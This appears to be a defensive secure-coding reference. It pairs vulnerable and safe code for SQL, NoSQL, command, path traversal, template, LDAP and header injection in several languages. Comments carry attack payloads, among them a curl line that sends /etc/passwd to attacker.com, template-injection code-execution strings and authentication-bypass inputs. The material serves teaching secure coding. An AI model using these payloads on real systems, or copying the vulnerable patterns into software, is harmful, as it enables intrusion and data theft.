# Injection Vulnerability Patterns by Language

## SQL Injection

### Python (SQLite / psycopg2 / MySQLdb)

**Vulnerable — f-string interpolation:**
```python
def get_user(username):
    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
    return cursor.fetchone()
# Payload: admin' OR '1'='1
```

**Vulnerable — string concatenation:**
```python
def search_products(keyword):
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
```

**Vulnerable — .format():**
```python
def get_order(order_id):
    cursor.execute("SELECT * FROM orders WHERE id = {}".format(order_id))
```

**Safe — parameterized query:**
```python
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
    return cursor.fetchone()
```

**Safe — ORM (Django):**
```python
User.objects.filter(username=username)  # Safe: Django ORM escapes automatically
```

**Vulnerable — Django ORM raw() bypass:**
```python
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")  # UNSAFE
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])  # Safe
```

### JavaScript / Node.js (mysql2, pg, sequelize)

**Vulnerable — template literal:**
```javascript
const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
```

**Vulnerable — string concatenation:**
```javascript
db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'", callback);
```

**Vulnerable — Sequelize literal() misuse:**
```javascript
User.findAll({ where: sequelize.literal(`username = '${req.body.username}'`) });
```

**Safe — parameterized:**
```javascript
const result = await pool.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
db.query("SELECT * FROM users WHERE email = ?", [req.body.email], callback);
```

**Safe — Sequelize ORM:**
```javascript
User.findAll({ where: { email: req.body.email } }); // Safe
```

### Java (JDBC)

**Vulnerable — Statement.execute with concatenation:**
```java
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Vulnerable — createNativeQuery:**
```java
String query = "SELECT * FROM User u WHERE u.username = '" + username + "'";
entityManager.createNativeQuery(query, User.class).getResultList();
```

**Safe — PreparedStatement:**
```java
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

**Safe — JPA JPQL with named parameters:**
```java
TypedQuery<User> q = em.createQuery("SELECT u FROM User u WHERE u.username = :name", User.class);
q.setParameter("name", username);
```

### PHP (PDO / MySQLi)

**Vulnerable — direct interpolation:**
```php
$result = mysqli_query($conn, "SELECT * FROM users WHERE username = '$username'");
$result = $pdo->query("SELECT * FROM users WHERE id = " . $_GET['id']);
```

**Safe — PDO prepared statement:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$row = $stmt->fetch();
```

**Safe — MySQLi prepared statement:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### Go (database/sql)

**Vulnerable:**
```go
rows, err := db.Query("SELECT * FROM users WHERE name = '" + name + "'")
rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))
```

**Safe:**
```go
rows, err := db.Query("SELECT * FROM users WHERE name = ?", name)
rows, err := db.Query("SELECT * FROM users WHERE id = $1", id)
```

### Ruby (ActiveRecord)

**Vulnerable — string interpolation in where():**
```ruby
User.where("username = '#{params[:username]}'")
User.where("id = " + params[:id])
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")
```

**Safe:**
```ruby
User.where(username: params[:username])
User.where("username = ?", params[:username])
User.where("username = :name", name: params[:username])
```

### C# (ADO.NET / Entity Framework)

**Vulnerable:**
```csharp
string query = "SELECT * FROM Users WHERE Username = '" + username + "'";
SqlCommand cmd = new SqlCommand(query, conn);
```

**Vulnerable — EF raw query:**
```csharp
context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'");
```

**Safe:**
```csharp
SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @username", conn);
cmd.Parameters.AddWithValue("@username", username);
```

**Safe — EF with parameterized:**
```csharp
context.Users.FromSqlRaw("SELECT * FROM Users WHERE Username = {0}", username);
context.Users.Where(u => u.Username == username); // ORM safe
```

---

## NoSQL Injection (MongoDB)

### JavaScript / Node.js (mongoose)

**Vulnerable — direct object spread from request body:**
```javascript
// POST /login body: {"username": {"$ne": null}, "password": {"$ne": null}}
const user = await User.findOne({ username: req.body.username, password: req.body.password });
// Returns first user without knowing credentials!
```

**Vulnerable — $where with user input:**
```javascript
db.collection('users').find({ $where: `this.username == '${username}'` });
// Payload: '; return true; var x = '
// Executes arbitrary JavaScript server-side
```

**Vulnerable — aggregate with user-controlled pipeline:**
```javascript
const pipeline = JSON.parse(req.body.pipeline);
db.collection('orders').aggregate(pipeline);
```

**Safe — explicit field extraction + type checking:**
```javascript
const username = String(req.body.username);  // Force string type
const password = String(req.body.password);
const user = await User.findOne({ username, password });
```

**Safe — schema validation with mongoose:**
```javascript
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});
// Schema enforces types; objects like {"$ne": null} get cast to string "[object Object]"
```

### Python (pymongo)

**Vulnerable:**
```python
user = db.users.find_one({"username": request.json.get("username"),
                           "password": request.json.get("password")})
# Attacker sends: {"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Safe — explicit string casting:**
```python
username = str(request.json.get("username", ""))
password = str(request.json.get("password", ""))
user = db.users.find_one({"username": username, "password": password})
```

---

## OS Command Injection

### Python

**Vulnerable — shell=True with f-string:**
```python
def ping_host(hostname):
    result = subprocess.run(f"ping -c 4 {hostname}", shell=True, capture_output=True)
    return result.stdout
# Payload: 127.0.0.1; cat /etc/passwd

def convert_image(filename):
    os.system(f"convert {filename} output.png")
# Payload: file.jpg; curl http://attacker.com/$(cat /etc/passwd)
```

**Vulnerable — popen with user input:**
```python
output = os.popen(f"whois {domain}").read()
```

**Safe — list form without shell=True:**
```python
def ping_host(hostname):
    # Validate input against allowlist first
    if not re.match(r'^[a-zA-Z0-9.\-]+$', hostname):
        raise ValueError("Invalid hostname")
    result = subprocess.run(["ping", "-c", "4", hostname], capture_output=True)
    return result.stdout
```

**Safe — shlex.quote for shell=True when unavoidable:**
```python
import shlex
result = subprocess.run(f"ping -c 4 {shlex.quote(hostname)}", shell=True)
```

### JavaScript / Node.js

**Vulnerable — exec with template literal:**
```javascript
const { exec } = require('child_process');
exec(`ls -la ${req.query.path}`, (err, stdout) => res.send(stdout));
// Payload: /tmp; cat /etc/passwd
```

**Vulnerable — execSync:**
```javascript
const output = execSync(`convert ${filename} output.png`).toString();
```

**Safe — execFile (no shell interpretation):**
```javascript
const { execFile } = require('child_process');
execFile('ls', ['-la', req.query.path], (err, stdout) => res.send(stdout));
```

**Safe — spawn with array args:**
```javascript
const { spawn } = require('child_process');
const ls = spawn('ls', ['-la', userPath]);
```

### Java

**Vulnerable — Runtime.exec with string concatenation:**
```java
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec("ping -c 4 " + hostname);
// Payload: 127.0.0.1; cat /etc/passwd (may work depending on Runtime.exec parsing)
```

**Vulnerable — ProcessBuilder with shell:**
```java
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping -c 4 " + hostname);
```

**Safe — ProcessBuilder with argument array:**
```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", hostname);
pb.redirectErrorStream(true);
Process p = pb.start();
```

### PHP

**Vulnerable:**
```php
$output = shell_exec("ping -c 4 " . $_GET['host']);
$output = system("whois " . $domain);
$output = passthru("nslookup " . $hostname);
echo `convert {$_FILES['file']['name']} output.png`;
```

**Safe:**
```php
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 4 " . $host);
// Note: prefer exec() with explicit args array when possible
```

### Go

**Vulnerable:**
```go
cmd := exec.Command("sh", "-c", "ping -c 4 " + hostname)
// Payload: 127.0.0.1; id

out, _ := exec.Command("bash", "-c", fmt.Sprintf("ls %s", path)).Output()
```

**Safe:**
```go
cmd := exec.Command("ping", "-c", "4", hostname)
out, err := cmd.Output()
```

### Ruby

**Vulnerable:**
```ruby
`ping -c 4 #{params[:host]}`
system("convert #{filename} output.png")
IO.popen("whois #{domain}")
exec("ls #{path}")
```

**Safe:**
```ruby
system("ping", "-c", "4", params[:host])  # Array form, no shell
Open3.popen3("ping", "-c", "4", host)
```

---

## Path Traversal / Arbitrary File Read

### Python (Flask)

**Vulnerable:**
```python
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f"/var/www/uploads/{filename}")
# Payload: ../../etc/passwd
```

**Vulnerable — open() with user input:**
```python
@app.route('/read')
def read_template():
    name = request.args.get('name')
    with open(f"templates/{name}.html") as f:
        return f.read()
```

**Safe — os.path.basename + realpath check:**
```python
import os

UPLOAD_DIR = "/var/www/uploads"

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not safe_path.startswith(UPLOAD_DIR + os.sep):
        abort(403)
    return send_file(safe_path)
```

**Safe — Flask send_from_directory:**
```python
from flask import send_from_directory

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory('/var/www/uploads', filename)  # Handles traversal
```

### JavaScript / Node.js

**Vulnerable:**
```javascript
app.get('/file', (req, res) => {
    const filePath = path.join(__dirname, 'public', req.query.name);
    fs.readFile(filePath, (err, data) => res.send(data));
});
// Payload: ?name=../../../../etc/passwd
```

**Safe:**
```javascript
app.get('/file', (req, res) => {
    const base = path.resolve(__dirname, 'public');
    const requested = path.resolve(base, req.query.name);
    if (!requested.startsWith(base + path.sep)) {
        return res.status(403).send('Forbidden');
    }
    fs.readFile(requested, (err, data) => res.send(data));
});
```

### Java (Spring)

**Vulnerable:**
```java
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
    Path file = Paths.get("/uploads/" + filename);
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok().body(resource);
}
```

**Safe:**
```java
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
    Path base = Paths.get("/uploads").toRealPath();
    Path file = base.resolve(filename).normalize().toRealPath();
    if (!file.startsWith(base)) {
        throw new AccessDeniedException("Path traversal detected");
    }
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok().body(resource);
}
```

### PHP

**Vulnerable:**
```php
$file = $_GET['page'];
include("pages/" . $file . ".php");
// Payload: ../../../../etc/passwd%00 (null byte on older PHP)
// Payload: ../../../../etc/passwd (with .php appended — bypass via other tricks)

$content = file_get_contents("/var/www/uploads/" . $_GET['file']);
```

**Safe:**
```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed, true)) {
    die("Page not found");
}
include("pages/" . $page . ".php");
```

---

## SSTI (Server-Side Template Injection)

### Python (Jinja2 / Flask)

**Vulnerable — render_template_string with user input:**
```python
from flask import render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
# Payload: {{7*7}} → renders 49
# Payload: {{config.SECRET_KEY}} → leaks secret
# RCE: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

**Vulnerable — Template() with user input:**
```python
from jinja2 import Template

@app.route('/render')
def render():
    user_template = request.args.get('template')
    t = Template(user_template)  # UNSAFE — user controls template source
    return t.render(name="World")
```

**Safe — always pass user data as variables, never as template source:**
```python
from flask import render_template

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    return render_template('greet.html', name=name)  # name is a variable, not template
```

### JavaScript / Node.js (EJS, Nunjucks, Pug)

**Vulnerable — EJS with user-controlled template:**
```javascript
const ejs = require('ejs');
app.get('/render', (req, res) => {
    const output = ejs.render(req.query.template, { user: req.user });
    // Payload: <%- global.process.mainModule.require('child_process').execSync('id') %>
    res.send(output);
});
```

**Vulnerable — Nunjucks renderString:**
```javascript
const nunjucks = require('nunjucks');
const output = nunjucks.renderString(userInput, context);
```

**Safe:**
```javascript
// Always use a fixed template file, pass data as context variables
app.get('/greet', (req, res) => {
    res.render('greet.ejs', { name: req.query.name });  // greet.ejs is a static file
});
```

### Java (FreeMarker, Velocity, Thymeleaf)

**Vulnerable — FreeMarker with user template string:**
```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
Template t = new Template("name", new StringReader(userInput), cfg);
// Payload: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Vulnerable — Spring Expression Language (SpEL) injection:**
```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // RCE via SpEL
Object value = exp.getValue(context);
```

**Safe — use ClassLoader restrictions and fixed template names:**
```java
Template t = cfg.getTemplate("fixed-template.ftl");  // Static template file
t.process(dataModel, out);
```

---

## LDAP Injection

### Python (ldap3)

**Vulnerable:**
```python
search_filter = f"(&(uid={username})(userPassword={password}))"
conn.search('dc=example,dc=com', search_filter)
# Payload username: *)(&   → filter becomes (&(uid=*)(&)(userPassword=x))
# Bypasses auth — uid=* matches any user
```

**Safe:**
```python
from ldap3.utils.conv import escape_filter_chars

safe_username = escape_filter_chars(username)
safe_password = escape_filter_chars(password)
search_filter = f"(&(uid={safe_username})(userPassword={safe_password}))"
```

### Java (javax.naming)

**Vulnerable:**
```java
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
NamingEnumeration results = ctx.search("dc=example,dc=com", filter, controls);
```

**Safe:**
```java
String filter = "(&(uid={0})(userPassword={1}))";
Object[] filterArgs = { username, password };
NamingEnumeration results = ctx.search("dc=example,dc=com", filter, filterArgs, controls);
// javax.naming escapes filterArgs automatically
```

---

## Header / CRLF Injection

### Python (Flask / Django)

**Vulnerable — user input in redirect location:**
```python
@app.route('/redirect')
def do_redirect():
    url = request.args.get('next')
    response = make_response('', 302)
    response.headers['Location'] = url
    return response
# Payload: /redirect?next=https://evil.com%0d%0aSet-Cookie:%20session=hijacked
```

**Vulnerable — user input in custom header:**
```python
resp.headers['X-Custom'] = request.args.get('value')
```

**Safe:**
```python
from urllib.parse import urlparse

@app.route('/redirect')
def do_redirect():
    url = request.args.get('next', '/')
    # Validate URL is relative or same-origin
    parsed = urlparse(url)
    if parsed.netloc and parsed.netloc != request.host:
        url = '/'
    # Strip CR/LF
    url = url.replace('\r', '').replace('\n', '')
    return redirect(url)
```

### PHP

**Vulnerable:**
```php
header("Location: " . $_GET['url']);
// Payload: ?url=http://example.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

**Safe:**
```php
$url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
if ($url === false) { $url = '/'; }
header("Location: " . $url);
```
